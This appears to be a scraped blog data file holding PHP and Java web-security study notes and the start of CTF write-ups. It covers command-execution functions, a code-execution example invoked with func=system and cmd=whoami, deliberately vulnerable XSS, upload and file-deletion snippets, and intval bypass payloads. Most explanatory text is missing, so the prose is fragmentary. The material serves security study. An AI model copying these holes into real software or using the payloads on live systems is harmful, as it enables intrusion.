\tresponse.getWriter().println(&quot;delete success&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete failed&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"PHP-JAVA\"><a href=\"#PHP-JAVA\" class=\"headerlink\" title=\"PHP &#x2F; JAVA\"></a>PHP &#x2F; JAVA</h1><h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><h3 id=\"1-php-\"><a href=\"#1-php-\" class=\"headerlink\" title=\"1.php \"></a>1.php </h3><ul>\n<li><code>system()</code> OS</li>\n<li><code>passthru()</code>OS</li>\n<li><code>exec()</code>OS</li>\n<li><code>shell_exec</code> OS</li>\n<li><code>popen()/proc_open()</code>OS**<u>fread</u>**</li>\n<li><code> </code> [&#96;&#96;]OS</li>\n</ul>\n<h3 id=\"2-phpphp-ini\"><a href=\"#2-phpphp-ini\" class=\"headerlink\" title=\"2.phpphp.ini\"></a>2.phpphp.ini</h3><p>php</p>\n<ul>\n<li><p><code>file://</code>  file:&#x2F;&#x2F; offallow_url_fopen off&#x2F;on allow_url_includeoff&#x2F;on</p>\n</li>\n<li><p><code>php://filter</code> base64phpoff</p>\n</li>\n<li><p><code>php://input</code> POSTallow_url_fopen off&#x2F;on</p>\n<p>allow_url_includeon</p>\n</li>\n<li><p><code>zip:// compress.bzip:// compress.zlib://</code>off</p>\n</li>\n<li><p><code>data://</code> PHPon</p>\n</li>\n<li><p><code>phar:/</code>&#x2F;  zipzipphar</p>\n</li>\n</ul>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><ul>\n<li><p><code>preg_replace()</code> php 5.6 &#x2F;e  magic_quotes_gpc&#x3D;Off php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&#x27; . $_GET[&#x27;reg&#x27;], &#x27;\\\\1&#x27; ,&#x27;&lt;php&gt;phpinfo()&lt;php&gt;&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/anything/e&#x27;, $_GET[&#x27;test&#x27;], &#x27;anything_test&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&lt;\\/php&gt;/e&#x27;, &#x27;\\\\1&#x27;, $_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>array_map()</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $func=$_GET[&#x27;func&#x27;];</span><br><span class=\"line\">    $cmd=$_POST[&#x27;cmd&#x27;];</span><br><span class=\"line\">    $array[0]=$cmd;</span><br><span class=\"line\">    $new_array=array_map($func,$array);</span><br><span class=\"line\">    echo $new_array;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//    http://localhost/123.php?func=system   cmd=whoami</span><br><span class=\"line\"> //   http://localhost/123.php?func=assert   cmd</span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><code>assert()</code> </p>\n<blockquote>\n<p>assertPHP</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"4-php--\"><a href=\"#4-php--\" class=\"headerlink\" title=\"4.php &#x2F;\"></a>4.php &#x2F;</h3><p>9</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents   // *</span><br><span class=\"line\">fread</span><br><span class=\"line\">fgets</span><br><span class=\"line\">fgetss</span><br><span class=\"line\">file</span><br><span class=\"line\">parse_ini_file</span><br><span class=\"line\">readfile    // *</span><br><span class=\"line\">highlight_file  // *</span><br><span class=\"line\">show_source // *</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file_get_contents</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file_get_contents&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fread</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fread&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>,<span class=\"number\">1024</span>);     <span class=\"comment\">//  resource </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgets</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgets&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);      </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgets</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">//  HTML  PHP </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgetss</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgetss&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);     </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgetss</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">//  HTML  PHP </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// readfile</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;readfile&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">readfile</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);      <span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>));      <span class=\"comment\">//  print_r  var_dump </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// parse_ini_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;parse_ini_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">parse_ini_file</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);        <span class=\"comment\">//  ini </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// show_source</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;show_source&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// highlight_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;highlight_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>PHP fweite() file_put_contents()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"5-php-\"><a href=\"#5-php-\" class=\"headerlink\" title=\"5.php \"></a>5.php </h3><ul>\n<li><p><code>include</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php include &#x27;test.php&#x27;;?&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>include_once</code>  </p>\n</li>\n<li><p><code>require</code> include</p>\n</li>\n<li><p><code>require_once</code>   require_once </p>\n</li>\n</ul>\n<p></p>\n<blockquote>\n<p>1includerequire2require_onceinclude_onceincluderequire</p>\n</blockquote>\n<h3 id=\"6-php\"><a href=\"#6-php\" class=\"headerlink\" title=\"6.php\"></a>6.php</h3><ul>\n<li><p><code>serialize()</code>  </p>\n</li>\n<li><p><code>unserialize()</code> </p>\n</li>\n<li><p> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.__construct()</span><br><span class=\"line\"></span><br><span class=\"line\">2.__destruct()</span><br><span class=\"line\"></span><br><span class=\"line\">3.__call()</span><br><span class=\"line\"></span><br><span class=\"line\">4.__callStatic()</span><br><span class=\"line\"></span><br><span class=\"line\">5.__get()</span><br><span class=\"line\"></span><br><span class=\"line\">6.__set()</span><br><span class=\"line\"></span><br><span class=\"line\">7.__isset()isset()empty()</span><br><span class=\"line\"></span><br><span class=\"line\">8.__unset()unset()</span><br><span class=\"line\"></span><br><span class=\"line\">9.__sleep()serialize()</span><br><span class=\"line\"></span><br><span class=\"line\">10.__wakeup()unserialize()</span><br><span class=\"line\"></span><br><span class=\"line\">11.__toString()</span><br><span class=\"line\"></span><br><span class=\"line\">12.__invoke()</span><br><span class=\"line\"></span><br><span class=\"line\">13.__set_state()var_export()</span><br><span class=\"line\"></span><br><span class=\"line\">14.__clone()</span><br><span class=\"line\"></span><br><span class=\"line\">15.__autoload()</span><br><span class=\"line\"></span><br><span class=\"line\">16.__debugInfo()</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"7-php-\"><a href=\"#7-php-\" class=\"headerlink\" title=\"7.php \"></a>7.php </h3><ul>\n<li><p><code>$_GET</code>  $_GET  method&#x3D;get </p>\n<p> GET </p>\n</li>\n<li><p><code>$POST</code> $_POST  method&#x3D;post </p>\n<p> POST </p>\n</li>\n<li><p><code>$_REQUEST</code> $_GET$POST</p>\n</li>\n<li><p><code>$_FILES</code> </p>\n</li>\n<li><p><code>$_COOKIE</code> cookie </p>\n</li>\n<li><p><code>$SESSION</code>Session</p>\n</li>\n</ul>\n<h2 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h2><h3 id=\"1-Web\"><a href=\"#1-Web\" class=\"headerlink\" title=\"1.Web\"></a>1.Web</h3><p>java EE web</p>\n<p><strong>tomcat   jetty  resin</strong></p>\n<p>java EE web </p>\n<p><strong>JBOSS   GlassFish   Weblogic   Webshpere</strong></p>\n<p></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/399939177\" >https://zhuanlan.zhihu.com/p/399939177<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"2-tomcat\"><a href=\"#2-tomcat\" class=\"headerlink\" title=\"2.tomcat\"></a>2.tomcat</h3><ul>\n<li><code>bin</code>:bat</li>\n<li><code>conf</code>:Tomcat</li>\n<li><code>lib</code>:Tomcatjarjar</li>\n<li><code>temp</code>:Tomcat</li>\n<li><code>webapps</code>:jar</li>\n<li><code>work</code>worktomcatJSP</li>\n</ul>\n<h3 id=\"3-tomcatweb-xml--tomcat-user-xml-\"><a href=\"#3-tomcatweb-xml--tomcat-user-xml-\" class=\"headerlink\" title=\"3.tomcatweb.xml  tomcat_user.xml \"></a>3.tomcatweb.xml  tomcat_user.xml </h3><p><code>web.xml</code><br>Tomcatweb.xmlconfweb.xml.,Tomcatweb.xmlweb.xml(WEB-INF&#x2F;web.xml).tomcatjspservlet,listjsp,404..</p>\n<p><code>tomcat-users.xml</code><br> tomcat.tomcat<a href=\"http://localhost:8080tomcat\">http://localhost:8080tomcat</a> manager,xml</p>\n<h3 id=\"4-jsp\"><a href=\"#4-jsp\" class=\"headerlink\" title=\"4.jsp\"></a>4.jsp</h3><blockquote>\n<p>JSPJava Server PagesJSPHTMLJava&lt;%%&gt;</p>\n<p>JSPJava servletJava webHTMLXHTMLXMLJSPJSP</p>\n<p>JSP</p>\n<p>JSPJavaBeans</p>\n</blockquote>\n<h3 id=\"5-java-xss\"><a href=\"#5-java-xss\" class=\"headerlink\" title=\"5.java xss\"></a>5.java xss</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xss   (name) </span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">String name = request.getParameter(&quot;name&quot;);</span><br><span class=\"line\">out.println(name)</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"> xss  (msg) </span><br><span class=\"line\">public void Message(HttpServletRequest req, HttpServletResponse resp) &#123;</span><br><span class=\"line\">\tString message = req.getParameter(&quot;msg&quot;);</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">\tresp.getWriter().print(message);</span><br><span class=\"line\">&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\te. printStackTrace();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">DOM xssJavaScript</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var pos = document.URL.indexOf(&quot;#&quot;)+1;</span><br><span class=\"line\">    var name = document.URL.substring(pos, document.URL.length);</span><br><span class=\"line\">    document.write(name);</span><br><span class=\"line\">eval(&quot;var a = &quot; + name);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">xss JDBC</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"6-Java-\"><a href=\"#6-Java-\" class=\"headerlink\" title=\"6.Java \"></a>6.Java </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Files.readAllBytesFiles.readAllLines</span><br><span class=\"line\">FileInputStream</span><br><span class=\"line\">FileOutputStream</span><br><span class=\"line\">File</span><br><span class=\"line\">FileUtils</span><br><span class=\"line\">IOUtils</span><br><span class=\"line\">BufferedReader</span><br><span class=\"line\">ServletFileUpload</span><br><span class=\"line\">MultipartFile</span><br><span class=\"line\">CommonsMultipartFile</span><br><span class=\"line\">PrintWriter</span><br><span class=\"line\">ZipInputStream</span><br><span class=\"line\">ZipEntry.getSize</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-\"><a href=\"#7-\" class=\"headerlink\" title=\"7.\"></a>7.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DiskFileItemFactory@MultipartConfigMultipartFileFile</span><br><span class=\"line\">Upload</span><br><span class=\"line\">InputStream</span><br><span class=\"line\">OutputStream</span><br><span class=\"line\">write</span><br><span class=\"line\">fileName</span><br><span class=\"line\">filePath</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"8-servlet\"><a href=\"#8-servlet\" class=\"headerlink\" title=\"8.servlet\"></a>8.servlet</h3><blockquote>\n<p>servlet3<br>commons-fileuploadcommons-iojar</p>\n<p>servlet3<br>request.getParts()</p>\n</blockquote>\n<h3 id=\"9-java\"><a href=\"#9-java\" class=\"headerlink\" title=\"9.java\"></a>9.java</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;</span><br><span class=\"line\">    Part part = request.getPart(&quot;fileName&quot;);</span><br><span class=\"line\">    if(part == null) &#123;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();</span><br><span class=\"line\">    part.write(filename);</span><br><span class=\"line\">    part.delete();</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-\"><a href=\"#10-\" class=\"headerlink\" title=\"10.\"></a>10.</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">if(file != null &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete success&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete failed&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"PHP","date":"2022-03-21T13:23:21.000Z","excerpt":"PHP","_content":"\n# PHP\n\nphp\n\n\n\n### web89\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\n\n`preg_match(\"/[0-9]/\", $num`\n\n`intval($num)``intval`\n\n\n\n**intval()**\n\n>  \n>  var  integer  0 array  0 array \n>  1 \n\n\n\n```\n<?php\n\necho intval(1234);  //1234\necho \"\\n\";\necho intval(042);  //34  08\necho \"\\n\";\necho intval(0x1a);  //26 0x16\necho \"\\n\";\necho intval(3e3);  //3000  3 X 10\necho \"\\n\";\necho intval('3e3');  //3000\necho \"\\n\";\necho intval(\"1234a\");  //1234\necho \"\\n\";\necho intval(4.2); //\n```\n\n\n\n\n\n```\n?num[]=a\n```\n\n\n\n### web90\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n} \n```\n\n\n\n`intval`\n\n```\nintval ( mixed $var [, int $base = 10 ] )\n```\n\n>  `base`  0 `var` \n>\n> -  \"0x\" ( \"0X\")  16  (hex)\n> -  \"0\"  8 (octal)\n> -  10  (decimal)\n\n```\nintval('4476a',0)=4476\nintval('010574',0)=4476\nintval('0x117c',0)=4476\n```\n\n\n\n\n\n### web91\n\n```\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n} \n```\n\n ``\n\n```\ni (ignore)\ng (global)\nm (more)\ns  . \nU ;; \n//:x ; \n//:A ;\n//:D $,; \n//:e preg_replace(), ;  \n```\n\n`(preg_match('/^php$/im', 